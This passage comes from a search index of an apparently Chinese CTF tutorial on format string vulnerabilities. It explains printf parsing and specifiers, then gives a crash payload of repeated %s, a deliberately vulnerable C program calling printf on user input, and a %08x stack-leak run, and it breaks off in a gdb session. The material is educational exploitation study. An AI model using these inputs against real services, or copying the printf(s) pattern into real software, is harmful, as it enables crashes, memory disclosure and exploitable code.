width\u3002\n\n\n\n\n\n\n\n\n\u53c2\u6570\n\n\n\u5c31\u662f\u76f8\u5e94\u7684\u8981\u8f93\u51fa\u7684\u53d8\u91cf\u3002\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\n\n\n\u5728\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u518d\u8bf4\u4e00\u4e9b\u6bd4\u8f83\u7ec6\u81f4\u7684\u5185\u5bb9\u3002\u6211\u4eec\u4e0a\u9762\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u662f\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\u8fdb\u884c\u89e3\u6790\u7684\u3002\n\u90a3\u4e48\u76f8\u5e94\u7684\u8981\u88ab\u89e3\u6790\u7684\u53c2\u6570\u7684\u4e2a\u6570\u4e5f\u81ea\u7136\u662f\u7531\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u63a7\u5236\n\u3002\u6bd4\u5982\u8bf4'%s'\u8868\u660e\u6211\u4eec\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002\n\n\n\u6211\u4eec\u518d\u7ee7\u7eed\u4ee5\u4e0a\u9762\u7684\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\n\n\n\n\n\u5bf9\u4e8e\u8fd9\u6837\u7684\u4f8b\u5b50\uff0c\u5728\u8fdb\u5165printf\u51fd\u6570\u7684\u4e4b\u524d(\u5373\u8fd8\u6ca1\u6709\u8c03\u7528printf)\uff0c\u6808\u4e0a\u7684\u5e03\u5c40\u7531\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u5982\u4e0b\n\n\nsome value\n3.14\n123456\naddr of \nred\n\naddr of format string: Color %s...\n\n\n\n\n\u6ce8\uff1a\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe3.14\u4e0a\u9762\u7684\u503c\u4e3a\u67d0\u4e2a\u672a\u77e5\u7684\u503c\u3002\n\n\n\u5728\u8fdb\u5165printf\u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u5176\u5b57\u7b26\u4f1a\u9047\u5230\u4e24\u79cd\u60c5\u51b5\n\n\n\n\n\u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u6807\u51c6\u8f93\u51fa\u3002\n\n\n\u5f53\u524d\u5b57\u7b26\u662f%\uff0c \u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26\n\n\n\u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519\n\n\n\u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%,\u8f93\u51fa%\n\n\n\u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa\n\n\n\n\n\n\n\n\n\u90a3\u4e48\u5047\u8bbe\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u7f16\u5199\u7a0b\u5e8f\u65f6\u5019\uff0c\u5199\u6210\u4e86\u4e0b\u9762\u7684\u6837\u5b50\n\n\nprintf\n(\nColor %s, Number %d, Float %4.2f\n);\n\n\n\n\n\n\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u5982\u4f55\u8fd0\u884c\u5462\uff1f\u7a0b\u5e8f\u7167\u6837\u4f1a\u8fd0\u884c\uff0c\u4f1a\u5c06\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\u4e0a\u9762\u7684\u4e09\u4e2a\u53d8\u91cf\u5206\u522b\u89e3\u6790\u4e3a\n\n\n\n\n\u89e3\u6790\u5176\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\n\n\n\u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u5f62\u503c\n\n\n\u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c\n\n\n\n\n\u5bf9\u4e8e2\uff0c3\u6765\u8bf4\u5012\u8fd8\u65e0\u59a8\uff0c\u4f46\u662f\u5bf9\u4e8e\u5bf9\u4e8e1\u6765\u8bf4\uff0c\u5982\u679c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\uff0c\u6bd4\u59820\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u56e0\u6b64\u800c\u5d29\u6e83\u3002\n\n\n\u8fd9\u57fa\u672c\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\u4e86\u3002\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttps://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_1", 
            "text": "\u4e3a\u4e86\u4ecb\u7ecd\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u4f1a\u5bf9\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5229\u7528\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_2", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06 \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u5176\u6765\u89e3\u6790\u4e4b\u540e\u7684\u53c2\u6570 \u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u5c31\u662f\u5c06\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u8868\u793a\u7684\u6570\u636e\u8f6c\u5316\u4e3a\u6211\u4eec\u4eba\u7c7b\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u3002\u51e0\u4e4e\u6240\u6709\u7684C/C++\u7a0b\u5e8f\u90fd\u4f1a\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765 \u8f93\u51fa\u4fe1\u606f\uff0c\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u6216\u8005\u5904\u7406\u5b57\u7b26\u4e32 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u5229\u7528\u7684\u65f6\u5019\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206   \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570  \u683c\u5f0f\u5316\u5b57\u7b26\u4e32  \u540e\u7eed\u53c2\u6570\uff0c \u53ef\u9009   \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5176\u5b9e\u76f8\u4fe1\u5927\u591a\u6570\u4eba\u90fd\u63a5\u89e6\u8fc7printf\u51fd\u6570\u4e4b\u7c7b\u7684\u3002\u4e4b\u540e\u6211\u4eec\u518d\u4e00\u4e2a\u4e00\u4e2a\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_3", 
            "text": "\u5e38\u89c1\u7684\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6709   \u8f93\u5165  scanf    \u8f93\u51fa      \u51fd\u6570  \u57fa\u672c\u4ecb\u7ecd      printf  \u8f93\u51fa\u5230stdout    fprintf  \u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41    vprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230 stdout    vfprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41    sprintf  \u8f93\u51fa\u5230\u5b57\u7b26\u4e32    snprintf  \u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32    vsprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32    vsnprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32    setproctitle  \u8bbe\u7f6eargv    syslog  \u8f93\u51fa\u65e5\u5fd7    err, verr, warn, vwarn\u7b49  \u3002\u3002\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e86\u89e3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u5982\u4e0b  %[parameter][flags][field width][.precision][length]type \n\u6bcf\u4e00\u79cdpattern\u7684\u542b\u4e49\u8bf7\u5177\u4f53\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32  \u3002\u4ee5\u4e0b\u51e0\u4e2apattern\u4e2d\u7684\u5bf9\u5e94\u9009\u62e9\u9700\u8981\u91cd\u70b9\u5173\u6ce8   parameter  n$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570    flag  field width  \u8f93\u51fa\u7684\u6700\u5c0f\u5bbd\u5ea6    precision  \u8f93\u51fa\u7684\u6700\u5927\u957f\u5ea6    length\uff0c\u8f93\u51fa\u7684\u957f\u5ea6  hh\uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u8282  h\uff0c\u8f93\u51fa\u4e00\u4e2a\u53cc\u5b57\u8282  \u200b    type  d/i\uff0c\u6709\u7b26\u53f7\u6574\u6570  u\uff0c\u65e0\u7b26\u53f7\u6574\u6570  x/X\uff0c16\u8fdb\u5236unsigned int \u3002x\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1bX\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002  o\uff0c8\u8fdb\u5236unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002  s\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u8f93\u51fanull\u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411wchar_t\u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528wcrtomb \u51fd\u6570\u3002  c\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u628aint\u53c2\u6570\u8f6c\u4e3aunsigned char\u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u628awint_t\u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684wchart_t\u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3anull\u5bbd\u5b57\u7b26\u3002  p\uff0c void *\u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002printf(\"%p\",a)\u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cfa\u7684\u503c\uff0cprintf(\"%p\",  a)\u6253\u5370\u53d8\u91cfa\u6240\u5728\u7684\u5730\u5740\u3002  n\uff0c\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002  %\uff0c ' % '\u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55flags, width\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_5", 
            "text": "\u5c31\u662f\u76f8\u5e94\u7684\u8981\u8f93\u51fa\u7684\u53d8\u91cf\u3002", 
            "title": "\u53c2\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_6", 
            "text": "\u5728\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u518d\u8bf4\u4e00\u4e9b\u6bd4\u8f83\u7ec6\u81f4\u7684\u5185\u5bb9\u3002\u6211\u4eec\u4e0a\u9762\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u662f\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\u8fdb\u884c\u89e3\u6790\u7684\u3002 \u90a3\u4e48\u76f8\u5e94\u7684\u8981\u88ab\u89e3\u6790\u7684\u53c2\u6570\u7684\u4e2a\u6570\u4e5f\u81ea\u7136\u662f\u7531\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u63a7\u5236 \u3002\u6bd4\u5982\u8bf4'%s'\u8868\u660e\u6211\u4eec\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002  \u6211\u4eec\u518d\u7ee7\u7eed\u4ee5\u4e0a\u9762\u7684\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd   \u5bf9\u4e8e\u8fd9\u6837\u7684\u4f8b\u5b50\uff0c\u5728\u8fdb\u5165printf\u51fd\u6570\u7684\u4e4b\u524d(\u5373\u8fd8\u6ca1\u6709\u8c03\u7528printf)\uff0c\u6808\u4e0a\u7684\u5e03\u5c40\u7531\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u5982\u4e0b  some value\n3.14\n123456\naddr of  red \naddr of format string: Color %s...  \u6ce8\uff1a\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe3.14\u4e0a\u9762\u7684\u503c\u4e3a\u67d0\u4e2a\u672a\u77e5\u7684\u503c\u3002  \u5728\u8fdb\u5165printf\u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u5176\u5b57\u7b26\u4f1a\u9047\u5230\u4e24\u79cd\u60c5\u51b5   \u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u6807\u51c6\u8f93\u51fa\u3002  \u5f53\u524d\u5b57\u7b26\u662f%\uff0c \u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26  \u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519  \u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%,\u8f93\u51fa%  \u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa     \u90a3\u4e48\u5047\u8bbe\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u7f16\u5199\u7a0b\u5e8f\u65f6\u5019\uff0c\u5199\u6210\u4e86\u4e0b\u9762\u7684\u6837\u5b50  printf ( Color %s, Number %d, Float %4.2f );   \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u5982\u4f55\u8fd0\u884c\u5462\uff1f\u7a0b\u5e8f\u7167\u6837\u4f1a\u8fd0\u884c\uff0c\u4f1a\u5c06\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\u4e0a\u9762\u7684\u4e09\u4e2a\u53d8\u91cf\u5206\u522b\u89e3\u6790\u4e3a   \u89e3\u6790\u5176\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32  \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u5f62\u503c  \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c   \u5bf9\u4e8e2\uff0c3\u6765\u8bf4\u5012\u8fd8\u65e0\u59a8\uff0c\u4f46\u662f\u5bf9\u4e8e\u5bf9\u4e8e1\u6765\u8bf4\uff0c\u5982\u679c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\uff0c\u6bd4\u59820\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u56e0\u6b64\u800c\u5d29\u6e83\u3002  \u8fd9\u57fa\u672c\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\u4e86\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_7", 
            "text": "https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2", 
            "title": "\u53c2\u8003\u9605\u8bfb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\n\n\n\u5176\u5b9e\uff0c\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c55\u793a\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u4e24\u4e2a\u5229\u7528\u624b\u6bb5\n\n\n\n\n\u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u56e0\u4e3a%s\u5bf9\u5e94\u7684\u53c2\u6570\u5730\u5740\u4e0d\u5408\u6cd5\u7684\u6982\u7387\u6bd4\u8f83\u5927\u3002\n\n\n\u67e5\u770b\u8fdb\u7a0b\u5185\u5bb9\uff0c\u6839\u636e%d\uff0c%f\u8f93\u51fa\u4e86\u6808\u4e0a\u7684\u5185\u5bb9\u3002\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u4f1a\u5bf9\u4e8e\u6bcf\u4e00\u65b9\u9762\u8fdb\u884c\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u91ca\u3002\n\n\n\u7a0b\u5e8f\u5d29\u6e83\n\n\n\u901a\u5e38\u6765\u8bf4\uff0c\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u662f\u6700\u4e3a\u7b80\u5355\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\u82e5\u5e72\u4e2a%s\u5373\u53ef\n\n\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n\n\n\n\n\u8fd9\u662f\u56e0\u4e3a\u6808\u4e0a\u4e0d\u53ef\u80fd\u6bcf\u4e2a\u503c\u90fd\u5bf9\u5e94\u4e86\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6240\u4ee5\u603b\u662f\u4f1a\u6709\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u3002\u8fd9\u4e00\u5229\u7528\uff0c\u867d\u7136\u653b\u51fb\u8005\u672c\u8eab\u4f3c\u4e4e\u5e76\u4e0d\u80fd\u63a7\u5236\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6837\u5374\u53ef\u4ee5\u9020\u6210\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u8fdc\u7a0b\u670d\u52a1\u6709\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u5176\u53ef\u7528\u6027\uff0c\u4f7f\u670d\u52a1\u5d29\u6e83\uff0c\u8fdb\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u80fd\u591f\u8bbf\u95ee\u3002\n\n\n\u6cc4\u9732\u5185\u5b58\n\n\n\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c\n\n\n\n\n\u6cc4\u9732\u6808\u5185\u5b58\n\n\n\u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c\n\n\n\u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58\n\n\n\n\n\n\n\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58\n\n\n\u5229\u7528GOT\u8868\u5f97\u5230libc\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83libc\u51fd\u6570\u5730\u5740\n\n\n\u76f2\u6253\uff0cdump\u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002\n\n\n\n\n\n\n\n\n\u6cc4\u9732\u6808\u5185\u5b58\n\n\n\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f\n\n\n##include \nstdio.h\n\n\nint\n \nmain\n()\n \n{\n\n  \nchar\n \ns\n[\n100\n];\n\n  \nint\n \na\n \n=\n \n1\n,\n \nb\n \n=\n \n0x22222222\n,\n \nc\n \n=\n \n-\n1\n;\n\n  \nscanf\n(\n%s\n,\n \ns\n);\n\n  \nprintf\n(\n%08x.%08x.%08x.%s\n\\n\n,\n \na\n,\n \nb\n,\n \nc\n,\n \ns\n);\n\n  \nprintf\n(\ns\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u7136\u540e\uff0c\u6211\u4eec\u7b80\u5355\u7f16\u8bd1\u4e00\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 make           \ngcc -fno-stack-protector -o leakmemory leakmemory.c\nleakmemory.c: In \nfunction\n \u2018main\u2019:\nleakmemory.c:7:10: warning: format not a string literal and no format arguments \n[\n-Wformat-security\n]\n\n   printf\n(\ns\n)\n;\n\n          ^\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7f16\u8bd1\u5668\u6307\u51fa\u4e86\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u7684\u95ee\u9898\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6\u5bf9\u5e94\u7684\u6808\u5185\u5b58\u3002\n\n\n\u6839\u636eC\u8bed\u8a00\u7684\u8c03\u7528\u89c4\u5219\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u4f7f\u7528\u6808\u4e0a\u81ea\u9876\u5411\u4e0a\u7684\u53d8\u91cf\u4f5c\u4e3a\u5176\u53c2\u6570(64\u4f4d\u4f1a\u6839\u636e\u5176\u4f20\u53c2\u7684\u89c4\u5219\u8fdb\u884c\u83b7\u53d6)\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd32\u4f4d\u3002\n\n\n\u83b7\u53d6\u6808\u53d8\u91cf\u6570\u503c\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u83b7\u53d6\u6808\u4e0a\u53d8\u91cf\u7684\u6570\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\n%08x.%08x.%08x   \n\n00000001\n.22222222.ffffffff.%08x.%08x.%08x\nffcfc400.000000c2.f765a6bb%                           \n\n\n\n\n\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002\u4e3a\u4e86\u66f4\u52a0\u7ec6\u81f4\u7684\u89c2\u5bdf\uff0c\u6211\u4eec\u5229\u7528GDB\u6765\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u9a8c\u8bc1\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u8fd9\u91cc\u5220\u9664\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u5173\u6ce8\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6808\u3002\n\n\n\u9996\u5148\uff0c\u542f\u52a8\u7a0b\u5e8f\uff0c\u5c06\u65ad\u70b9\u4e0b\u8f7dprintf\u51fd\u6570\u5904\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 gdb leakmemory\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x8048330\n\n\n\n\n\u4e4b\u540e\uff0c\u8fd0\u884c\u7a0b\u5e8f\n\n\ngef\u27a4  r\nStarting program: 